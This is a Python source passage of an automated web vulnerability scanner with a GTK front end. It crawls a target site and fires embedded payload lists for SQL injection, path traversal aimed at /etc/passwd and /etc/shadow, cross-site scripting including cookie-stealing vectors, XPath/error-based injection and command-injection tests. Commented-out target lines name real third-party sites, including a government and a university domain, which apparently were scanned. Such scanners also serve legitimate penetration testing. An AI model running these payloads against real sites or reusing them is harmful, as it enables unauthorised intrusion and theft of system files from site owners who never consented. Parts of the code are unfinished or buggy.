    def __init__(self,target,do_sql_get,do_sql_post,do_xss_get,do_xss_post,do_lfi,do_rce,do_xpath,do_proxy_chain,do_proxyport):
        self.mylist=[]
        self.mylist2=[]
        self.not_Duplicated=[]
        self.not_Duplicated_empty=[]
        self.not_Duplicated_Post=[]

        self.out_sqlget=[]
        self.out_sqlpost=[]

        self.out_xssGet={}
        self.out_xssPost={}
        
        self.out_lfi={}
        self.out_xpath={}
        self.out_rce=[]
        self.lista = []

        self.url = target
        self.ror_sql_get = do_sql_get
        self.ror_sql_post = do_sql_post
        self.ror_xss_get = do_xss_get
        self.ror_xss_post = do_xss_post
        self.ror_lfi = do_lfi
        self.ror_rce = do_rce
        self.ror_xpath = do_xpath
        self.ror_proxy_chain = do_proxy_chain
        self.ror_proxyport = do_proxyport


#        self.ror_proxy_chain
#        self.ror_proxyport



#        self.url = "http://www.galeriafernandosantos.com/"
#        self.url = "http://testphp.vulnweb.com/"
#        self.url = "http://alvanportal.edu.ng/" #Amir site challenge
#        self.url = "http://127.0.0.1/rce.php"
#        self.url = "http://app.justwedlinks.in/login.php"
#        self.url = "http://www.tunesoman.com/"
#        self.url = "http://www.ileswastesystems.co.uk/"
#        self.url = "http://www.shariatpur.gov.bd/"
#        self.url = "http://app.justwedlinks.in/"
#        self.url = "http://127.0.0.1/xss.php"
#        self.url = "http://www.rakamexports.net/" #############################fergh
#        self.url = "http://www.frema.it/"
#        self.url = "http://root0x00.altervista.org/sqli/xpath.php?id=1"

#        self.url="http://www.ajms.biz/"
#        self.url = "http://www.titivillus.it/"#
#        self.url = "http://www.jntuacep.ac.in/"
#        self.url ="http://www.spcstamps.com/"



    def intensive_crawle(self):


########################### External Links #########~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

        source_code_EL = requests.get(self.url)
        plain_text_EL = source_code_EL.text
        soup_EL = BeautifulSoup(plain_text_EL, "html.parser") # find all link in variable soup
        for link_EL in soup_EL.findAll('a'):
            try:

                href_EL = link_EL.get('href')
                if(("http" in href_EL) or ("https" in href_EL)):
                    if(self.url not in href_EL):
                        self.lista.append(href_EL)
                else:
                    pass
            except Exception as e:
                pass
#####~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

        source_code = requests.get(self.url)
        plain_text = source_code.text
        soup = BeautifulSoup(plain_text, "html.parser") # find all link in variable soup
        for link in soup.findAll('a'):
            try:
                href = link.get('href')
                if(self.url in href):
                    if(("@" in href) or (".pdf" in href) or (".jpg" in href) or (".jpeg" in href) or (".JPEG" in href) or (".zip" in href) or (".GIF" in href) or (".gif" in href) or (".JPG" in href) or (".png" in href) or ("javascript" in href) or (".PNG" in href) or ("css" in href)):
                        pass
                    else:
                        self.mylist.append(href)
                elif(("http" in href) or ("@" in href) or (".pdf" in href) or (".jpg" in href) or (".jpeg" in href) or (".JPEG" in href) or (".zip" in href) or (".GIF" in href) or (".gif" in href) or (".JPG" in href) or (".png" in href) or ("javascript" in href) or (".PNG" in href) or ("css" in href)):
                    pass
                else:
                    self.mylist.append(self.url+href)

            except Exception as e:
                if(e):
                    pass
                #################################################
        for item in self.mylist:
            source_code = requests.get(item)
            plain_text = source_code.text
            soup = BeautifulSoup(plain_text, "html.parser") # find all link in variable soup
            for link in soup.findAll('a'):
                try:
                    href = link.get('href')
                    if(self.url in href):
                        if(("@" in href) or (".pdf" in href) or (".jpg" in href) or (".jpeg" in href) or (".JPEG" in href) or (".zip" in href) or (".GIF" in href) or (".gif" in href) or (".JPG" in href) or (".png" in href) or ("javascript" in href) or (".PNG" in href) or ("css" in href)):
                            pass
                        else:
                            self.mylist2.append(href)
                    elif(("http" in href) or ("@" in href) or (".pdf" in href) or (".jpg" in href) or (".jpeg" in href) or (".JPEG" in href) or (".zip" in href) or (".GIF" in href) or (".gif" in href) or (".JPG" in href) or (".png" in href) or ("javascript" in href) or (".PNG" in href) or ("css" in href)):
                        pass
                    else:
                        if(href[len(href)-1] == "/"):
                            self.mylist2.append(item+href)
                        else:
                            self.mylist2.append(self.url+href)

                except Exception as e:
                    if(e):
                        pass
                    ######################################################

        for getitem in self.mylist2:
            if getitem not in self.not_Duplicated:
                self.not_Duplicated.append(getitem)



        if not self.not_Duplicated:
            pass
        else:
          if not self.ror_sql_get:
            pass
          else:
            passing1_2 = SQLInjection_Get(self.not_Duplicated)
            passing1_2.addsyntax_SQL()
            self.out_sqlget = passing1_2.return_SqlGet
            if not self.out_sqlget:
                pass
            else:
                print("[*] Get sql infection is %s\n"%self.out_sqlget)

          if not self.ror_lfi:
            pass
          else:
            passing1_3 = Local_file_include(self.not_Duplicated)
            passing1_3.lfi_checker()
            self.out_lfi = passing1_3.return_lfi
            if not self.out_lfi:
                pass
            else:
                print("[*] Local File Include infection is %s\n"%self.out_lfi)

          if not self.ror_xss_get:
            pass
          else:
            passing1_4 = Cross_Site_Scripting_Get(self.not_Duplicated)
            passing1_4.xss_checker()
            self.out_xssGet = passing1_4.return_xssGet
            if not self.out_xssGet:
                pass
            else:
                print("[*] Xss $_Get infection is %s\n"%self.out_xssGet)

          if not self.ror_xpath:
            pass
          else:
            passing1_5 = Xpath_injection(self.not_Duplicated)
            passing1_5.xpath_checker()
            self.out_xpath = passing1_5.return_xpath
            if not self.out_xpath:
                pass
            else:
                print("[*] Xpath infection is %s\n"%self.out_xpath)

#######~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        if not self.not_Duplicated:
            self.not_Duplicated_Post.append(self.url)
        else:
            #Get list post :
            for Post_list_urls in self.not_Duplicated:
                source_code = requests.get(Post_list_urls)
                plain_text = source_code.text
                if("<form" in plain_text):
                    self.not_Duplicated_Post.append(Post_list_urls)
                else:
                    pass
            ####
#######~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~        
        if not self.ror_rce:
          pass
        else:
          post_passing1_2 = Remote_Code_execution(self.not_Duplicated_Post)
          post_passing1_2.rce_checker()
          self.out_rce = post_passing1_2.return_rce
          if not self.out_rce:
              pass
          else:
              print("[*] Remote Code Execution infection is %s\n"%self.out_rce)

        if not self.ror_sql_post:
          pass
        else:
          post_passing1_3 = SQLInjection_Post(self.not_Duplicated_Post)
          post_passing1_3.Post_SQL()
          self.out_sqlpost = post_passing1_3.return_SqlPost
          if not self.out_sqlpost:
              pass
          else:
              print("[*] Sql $_Post infection is %s\n"%self.out_sqlpost)

        if not self.ror_xss_post:
          pass
        else:
          post_passing1_4 = Cross_Site_Scripting_Post(self.not_Duplicated_Post)
          post_passing1_4.Post_Xss()
          self.out_xssPost = post_passing1_4.return_xssPost
          if not self.out_xssPost:
              pass
          else:
              print("[*] Xss $_Post infection is %s\n"%self.out_xssPost)
        print("Scanne finished")

    def save_scan(self):
      passing_for_database = dbinsert(self.out_sqlget,self.out_lfi,self.out_xssGet,self.out_xpath,self.out_rce,self.out_sqlpost,self.out_xssPost)
      print("Save is done")

        

class SQLInjection_Get(object):
    def __init__(self,sql):
        self.sql_g = sql
        self.list_points_infected=[]
        self.Normal_page_SQL= ""
        self.Not_Normal_page_SQL= ""
        self.after_Syn=""
        self.return_SqlGet=""
    def addsyntax_SQL(self):
        for items in self.sql_g:
            source_code = requests.get(items,allow_redirects=False)
            plain_text = source_code.text
            self.Normal_page_SQL = BeautifulSoup(plain_text, "html.parser")

            if("=" in items):
                count_lenght = len(items)
                i = 0
                self.after_Syn = items+"%27"

                source_code = requests.get(self.after_Syn,allow_redirects=False)
                plain_text = source_code.text
                self.Not_Normal_page_SQL = BeautifulSoup(plain_text, "html.parser")
                if(self.Normal_page_SQL != self.Not_Normal_page_SQL):
                    self.list_points_infected.append(self.after_Syn)
                while(i < count_lenght):
                    if(items[i] == "&"):
                        self.after_Syn = items[:i]+"%27"+items[i:]
                
                        source_code = requests.get(self.after_Syn,allow_redirects=False)
                        plain_text = source_code.text
                        self.Not_Normal_page_SQL = BeautifulSoup(plain_text, "html.parser")
                
                        if(self.Normal_page_SQL != self.Not_Normal_page_SQL):
                            self.list_points_infected.append(self.after_Syn)
                    i+=1

        if not self.list_points_infected:
            pass
        else:
            self.return_SqlGet = self.list_points_infected


class Local_file_include(object):
    def __init__(self,lfi):
        self.g_lfi = lfi
        self.payload_lfi=["../../../../../../../../../../../../etc/passwd","/etc/passwd","///etc/passwd","/etc/passwd","../../../../../../../../../../../../etc/passwd","\etcpasswd","....................etcpasswd","../../../../../../../../../../../../etc/group","../../../../../../../../../../../../etc/group","etcpasswd","....................etcpasswd","//etc/passwd","....//....//....//....//....//....//....//....//....//....//etc/passwd","//etc/passwd","....//....//....//....//....//....//....//....//....//....//etc/passwd","///etc/hosts","../../../../../../../../../../../../etc/hosts","/etc/hosts","../../../../../../../../../../../../etc/hosts","///etc/shadow","../../../../../../../../../../../../etc/shadow","/etc/shadow","../../../../../../../../../../../../etc/shadow","..%20..%20..%20../etc/passwd","....//....//....//....//....//....//....//....//....//....//etc/hosts","....//....//....//....//....//....//....//....//....//....//etc/hosts","etcgroup","....................etcgroup","/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd","..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd","/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd"]
        self.appended=[]
        self.return_lfi={}

    def lfi_checker(self):
        for line1 in self.g_lfi:
            if("=" in line1):
                cleared = line1[:line1.index("=")+1]
                if(cleared not in self.appended):
                    self.appended.append(cleared)

        for ready_link in self.appended:
            for py in self.payload_lfi:
                go_lfi = ready_link+py
                response = requests.get(go_lfi,allow_redirects=False)
                page_source = response.text
                if(("root:" in page_source) or ("http://127.0.0.1/" in page_source) or ("localhost" in page_source)):
                    self.return_lfi.update({ready_link:py})
                    break
                else:
                    continue


class Cross_Site_Scripting_Get(object):
    def __init__(self,Gxss):
        self.xss_g = Gxss
        self.payload_xss=[""""><script>alert('XSS');</script>""",""""><IMG SRC=javascript:alert(&quot;XSS&quot;)>""",""""><IMG SRC=javascript:alert('XSS')>""",""""><scr<script>ipt>alert('XSS');</scr</script>ipt>""",""""><img src=foo.png onerror=alert(/xssed/)/>""",""""><? echo('<scr)'; echo('ipt>alert("XSS")</script>'); ?>""",""""><marquee><h1>XSS</h1></marquee>""",""""><IMG SRC="jav&#x09;ascript:alert('XSS');">""",""""></title><script>alert(/xss/)</script>""",""""><marquee><h1>XSS</h1></marquee>""",""""><IMG LOWSRC="javascript:alert('XSS')">""",""""><IMG DYNSRC="javascript:alert('XSS')">""",""""><font style='color:expression(alert(document.cookie))'>""",""""><img src=javascript:alert('XSS')>""",""""><script language=JavaScript>alert('XSS')</script>""",""""><body onLoad='alert('XSS');'""","""'/></a></><img src=1.gif onerror=alert(1)>""",""""><div style='x:expression((window.r==1)?'':eval('r=1;""",""""><META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">""",""""><svg onload=prompt(1)></svg>"""]
        self.appended=[]
        self.return_xssGet={}

    def xss_checker(self):
        for line1 in self.xss_g:
            if("=" in line1):
                cleared = line1[:line1.index("=")+1]
                if(cleared not in self.appended):
                    self.appended.append(cleared)

        for ready_link in self.appended:
            for py in self.payload_xss:
                try:
                    go_xss = ready_link+py
                    response = requests.get(go_xss,allow_redirects=False)
                    page_source = response.text
                    if((py in page_source)):
                        self.return_xssGet.update({ready_link:py})
                    else:
                        pass
                except Exception as e:
                    if(e):
                        pass

class Xpath_injection(object):
    def __init__(self,xpath):
        self.xpath_g = xpath
        self.xpath_list_test = ["%27/**x**/and/**x**/updatexml(0,concat(0x3a3a,0x496e66656374656420546f205870617468),0)--+-","%27/**x**/and/**x**/extractvalue(0x0a,concat(0x0a,(select 0x496e66656374656420546f205870617468)))--+-","/**x**/and/**x**/extractvalue(0x0a,concat(0x0a,(select 0x496e66656374656420546f205870617468)))--+-","/**x**/and/**x**/updatexml(0,concat(0x3a3a,0x496e66656374656420546f205870617468),0)--+-"]
        self.return_xpath={}
        self.appended=[]
    
    def xpath_checker(self):

        for line1 in self.xpath_g:
            if("=" in line1):
                cleared = line1[:line1.index("=")+1]
                if(cleared not in self.appended):
                    self.appended.append(cleared)

        for sites in self.appended:
            for xpath in self.xpath_list_test:
                try:
                    url_xpath = sites+xpath
                    response = requests.get(url_xpath,allow_redirects=False)
                    source_code = response.text
                    if ("Infected To Xpath" in source_code):
                        self.return_xpath.update({sites:xpath})
                    else:
                        pass
                except Exception as e:
                    if(e):
                        pass


#class Local_file_disclose(object):
#   def __init__(self,lfd):
#       self.new = lfd
#   def lfd_checker(self):


class Remote_Code_execution(object):
    def __init__(self,rce):
        self.rce = rce
        self.return_rce=[]

    def rce_checker(self):
        self.key = "echo 'test rce';"
        self.my_submit_variable = ""
        self.my_submit_variable_content = ""
        for url_rce in self.rce:
            try:
                self.list1=[]
                self.list_var=[]

                self.list1_1=[]
                self.list_var_1=[]

                self.dic_={}

                source_code = requests.get(url_rce)
                plain_text = source_code.text

                soup = BeautifulSoup(plain_text, "html.parser") # find all link in variable soup
                inputs = soup.find_all("form")

                self.list1.append(str(inputs))
                pattern=re.compile("type=([^ ]*)") # match "name=" followed by everything except space character
                for match in pattern.findall(str(self.list1)):
                    self.list_var.append(match)
                self.list_var = re.findall('"([^"]*)"', str(self.list_var))
                ############################################################################
                self.list1_1.append(str(inputs))
                pattern_1=re.compile("name=([^ ]*)") # match "name=" followed by everything except space character
                for match_1 in pattern_1.findall(str(self.list1_1)):
                    self.list_var_1.append(match_1)
                self.list_var_1 = re.findall('"([^"]*)"', str(self.list_var_1))

                lengh_names = len(self.list_var_1)
                lengh_type = len(self.list_var)

                if (lengh_names < lengh_type):
                    self.dic_.update({"var":self.list_var[len(self.list_var)-1]})
                    for it in range(0,lengh_names):
                        self.dic_.update({self.list_var_1[it]:self.list_var[it]})
                else:
                    for it in range(0,lengh_names):
                        self.dic_.update({self.list_var_1[it]:self.list_var[it]})

                browser = webdriver.PhantomJS()
                browser.get(url_rce) 
                time.sleep(5)

                page = ""
                for x in self.dic_:
                    if((self.dic_[x] == 'hidden') or (self.dic_[x] == 'submit') or (self.dic_[x] == 'Submit')):
                        self.my_submit_variable = x
                        self.my_submit_variable_content = self.dic_[x]
                    else:
                        var = browser.find_element_by_xpath("//*[@type='"+self.dic_[x]+"']") and browser.find_element_by_name(x)
                        var.send_keys(self.key)
                login_attempt = browser.find_element_by_xpath("//*[@type='"+self.my_submit_variable_content+"']")
                login_attempt.click()
                page = browser.page_source
                browser.close()
                subprocess.call(["killall", "phantomjs"]) & subprocess.call(["killall", "node"])
################################################################################################################################
                if(("test rce" in page) and ("echo" not in page)): #Easy test dude as you can see in one line :p
                    self.return_rce.append(url_rce)
                else:
                    pass
            except Exception as e:
                if(e):
                    pass
            
class SQLInjection_Post(object):
    def __init__(self,Psql):
        self.sql_p = Psql
        self.return_SqlPost =[]

    def Post_SQL(self):
        self.key = "azerty"
        self.key_syntax = self.key+"'"

        self.my_submit_variable = ""
        self.my_submit_variable_content = ""

        for url in self.sql_p:
            try:
                self.list1=[]
                self.list_var=[]

                self.list1_1=[]
                self.list_var_1=[]

                self.dic_={}
                
                source_code = requests.get(url)
                plain_text = source_code.text
                                    
                soup = BeautifulSoup(plain_text, "html.parser") # find all link in variable soup
                inputs = soup.find_all("form")

                self.list1.append(str(inputs))
                pattern=re.compile("type=([^ ]*)") # match "name=" followed by everything except space character
                for match in pattern.findall(str(self.list1)):
                            self.list_var.append(match)
                self.list_var = re.findall('"([^"]*)"', str(self.list_var))
                ############################################################################
                self.list1_1.append(str(inputs))
                pattern_1=re.compile("name=([^ ]*)") # match "name=" followed by everything except space character
                for match_1 in pattern_1.findall(str(self.list1_1)):
                            self.list_var_1.append(match_1)
                self.list_var_1 = re.findall('"([^"]*)"', str(self.list_var_1))



                lengh_names = len(self.list_var_1)
                lengh_type = len(self.list_var)


                if (lengh_names < lengh_type):
                    self.dic_.update({"var":self.list_var[len(self.list_var)-1]})
                    for it in range(0,lengh_names):
                        self.dic_.update({self.list_var_1[it]:self.list_var[it]})
                else:
                    for it in range(0,lengh_names):
                        self.dic_.update({self.list_var_1[it]:self.list_var[it]})

                browser = webdriver.PhantomJS()
                browser.get(url) 
                time.sleep(10)

                html_normal = ""

                html_with_syntax = ""

                for x in self.dic_:
                    if((self.dic_[x] == 'hidden') or (self.dic_[x] == 'submit') or (self.dic_[x] == 'Submit')):
                        self.my_submit_variable = x
                        self.my_submit_variable_content = self.dic_[x]
                    else:
                        var = browser.find_element_by_xpath("//*[@type='"+self.dic_[x]+"']") and browser.find_element_by_name(x)
                        var.send_keys(self.key)
                login_attempt = browser.find_element_by_xpath("//*[@type='"+self.my_submit_variable_content+"']")
                login_attempt.click()
                html_normal = browser.page_source
                browser.close()
                subprocess.call(["killall", "phantomjs"]) & subprocess.call(["killall", "node"])
        ########################################################################################################
                browser = webdriver.PhantomJS()
                browser.get(url) 
                time.sleep(10)
                
                for x in self.dic_:
                    if((self.dic_[x] == 'hidden') or (self.dic_[x] == 'submit') or (self.dic_[x] == 'Submit')):
                        self.my_submit_variable = x
                        self.my_submit_variable_content = self.dic_[x]
                    else:
                        var = browser.find_element_by_xpath("//*[@type='"+self.dic_[x]+"']") and browser.find_element_by_name(x)
                        var.send_keys(self.key_syntax)
                login_attempt = browser.find_element_by_xpath("//*[@type='"+self.my_submit_variable_content+"']")
                login_attempt.click()
                html_with_syntax = browser.page_source
                
                browser.close()
                subprocess.call(["killall", "phantomjs"]) & subprocess.call(["killall", "node"])
                if(html_normal != html_with_syntax):
                    self.return_SqlPost.append(url)
                else:
                    pass
            except Exception as e:
                if(e):
                    pass
#            subprocess.call(["killall", "phantomjs"]) & subprocess.call(["killall", "node"])

class Cross_Site_Scripting_Post(object):
    def __init__(self,Pxss):
        self.xss_p = Pxss
        self.payload_xss = ["""<marquee><h1>XSS</h1></marquee>""","""<IMG SRC=javascript:alert(&quot;XSS&quot;)>""","""<IMG SRC=javascript:alert('XSS')>""","""<scr<script>ipt>alert('XSS');</scr</script>ipt>""","""<img src=foo.png onerror=alert(/xssed/)/>""","""<? echo('<scr)'; echo('ipt>alert("XSS")</script>'); ?>""","""<script>alert('XSS');</script>""","""<IMG SRC="jav&#x09;ascript:alert('XSS');">""","""</title><script>alert(/xss/)</script>""","""<IMG LOWSRC="javascript:alert('XSS')">""","""<IMG DYNSRC="javascript:alert('XSS')">""","""<font style='color:expression(alert(document.cookie))'>""","""<img src=javascript:alert('XSS')>""","""<script language=JavaScript>alert('XSS')</script>""","""<body onLoad='alert('XSS');'""","""</a></><img src=1.gif onerror=alert(1)>""","""<div style='x:expression((window.r==1)?'':eval('r=1;""",""""><marquee><h1>XSS</h1></marquee>""","""<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">""","""<svg onload=prompt(1)></svg>"""]
        self.return_xssPost={}

    def Post_Xss(self):
        self.my_submit_variable = ""
        self.my_submit_variable_content = ""

        for url_Pxss in self.xss_p:
            for xss_py in self.payload_xss:
                try:
                    self.list1=[]
                    self.list_var=[]

                    self.list1_1=[]
                    self.list_var_1=[]

                    self.dic_={}
                    
                    source_code = requests.get(url_Pxss)
                    plain_text = source_code.text
                                        
                    soup = BeautifulSoup(plain_text, "html.parser") # find all link in variable soup
                    inputs = soup.find_all("form")

                    self.list1.append(str(inputs))
                    pattern=re.compile("type=([^ ]*)") # match "name=" followed by everything except space character
                    for match in pattern.findall(str(self.list1)):
                                self.list_var.append(match)
                    self.list_var = re.findall('"([^"]*)"', str(self.list_var))
                    ############################################################################
                    self.list1_1.append(str(inputs))
                    pattern_1=re.compile("name=([^ ]*)") # match "name=" followed by everything except space character
                    for match_1 in pattern_1.findall(str(self.list1_1)):
                                self.list_var_1.append(match_1)
                    self.list_var_1 = re.findall('"([^"]*)"', str(self.list_var_1))



                    lengh_names = len(self.list_var_1)
                    lengh_type = len(self.list_var)


                    if (lengh_names < lengh_type):
                        self.dic_.update({"var":self.list_var[len(self.list_var)-1]})
                        for it in range(0,lengh_names):
                            self.dic_.update({self.list_var_1[it]:self.list_var[it]})
                    else:
                        for it in range(0,lengh_names):
                            self.dic_.update({self.list_var_1[it]:self.list_var[it]})

                    browser = webdriver.PhantomJS()
                    browser.get(url_Pxss) 
#                    time.sleep(5)

                    html_ = ""

                    for x in self.dic_:
                        if((self.dic_[x] == 'hidden') or (self.dic_[x] == 'submit') or (self.dic_[x] == 'Submit')):
                            self.my_submit_variable = x
                            self.my_submit_variable_content = self.dic_[x]
                        else:
                            var = browser.find_element_by_xpath("//*[@type='"+self.dic_[x]+"']") and browser.find_element_by_name(x)
                            var.send_keys(xss_py)
                    login_attempt = browser.find_element_by_xpath("//*[@type='"+self.my_submit_variable_content+"']")
                    login_attempt.click()  
                    html_ = browser.page_source
                    
                    browser.close()
                    subprocess.call(["killall", "phantomjs"]) & subprocess.call(["killall", "node"])
                    if(xss_py in html_):
                        self.return_xssPost.update({url_Pxss:xss_py})
                    else:
                        pass
                except Exception as e:
                    if(e):
                        pass
#                subprocess.call(["killall", "phantomjs"]) & subprocess.call(["killall", "node"])

class dbinsert(object):
    """docstring for dbinsert"""
    def __init__(self, list_Sql_get, dic_lfi, dic_xss_get, dic_xpath, list_rce, list_Sql_post, dic_xss_post):
        self.get_list_sql_get = list_Sql_get
        self.get_dic_lfi = dic_lfi
        self.get_dic_xss_get = dic_xss_get
        self.get_dic_xpath = dic_xpath
        self.get_list_rce = list_rce
        self.get_list_Sql_post = list_Sql_post
        self.get_dic_xss_post = dic_xss_post


######################### [1] List Sql Get 
        if not self.get_list_sql_get:
            pass
            print("passed")
        else:
            self.check_list(self.get_list_sql_get)

######################### [2] Dic Lfi
        if not self.get_dic_lfi:
            pass
            print("passed")
        else:
            self.check_dic(self.get_dic_lfi)

######################## [3] Dic xss Get
        if not self.get_dic_xss_get:
            pass
            print("passed")
        else:
            self.check_dic(self.get_dic_xss_get)

######################## [4] Dic Xpath
        if not self.get_dic_xpath:
            pass
            print("passed")
        else:
            self.check_dic(self.get_dic_xpath)

######################## [5] List Rce
        if not self.get_list_rce:
            pass
            print("passed")
        else:
            self.check_list(self.get_list_rce)

######################## [6] Lsit Sql Post
        if not self.get_list_Sql_post:
            pass
            print("passed")
        else:
            self.check_list(self.get_list_Sql_post)

######################## [7] Dic Xss Post
        if not self.get_dic_xss_post:
            pass
            print("passed")
        else:
            self.check_dic(self.get_dic_xss_post)


    def check_dic(self, anydic):
        self.dictionary = anydic
        """
          Insert query for dictionary type shall be here
            """
        for anyX in self.dictionary:
          print(anyX)

    def check_list(self, anylst):
        self.any_comming_list = anylst
        """
          Insert query for List type shall be here
            """
        for anyY in self.dictionary:
          print(anyY)
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++


cssProvider = Gtk.CssProvider()
cssProvider.load_from_path('body.css')
screen = Gdk.Screen.get_default()
styleContext = Gtk.StyleContext()
styleContext.add_provider_for_screen(screen, cssProvider,
                                     Gtk.STYLE_PROVIDER_PRIORITY_USER)


if __name__ == '__main__':
    win = MyWindow()
    win.connect("delete-event", Gtk.main_quit)
    win.show_all()
    Gtk.main()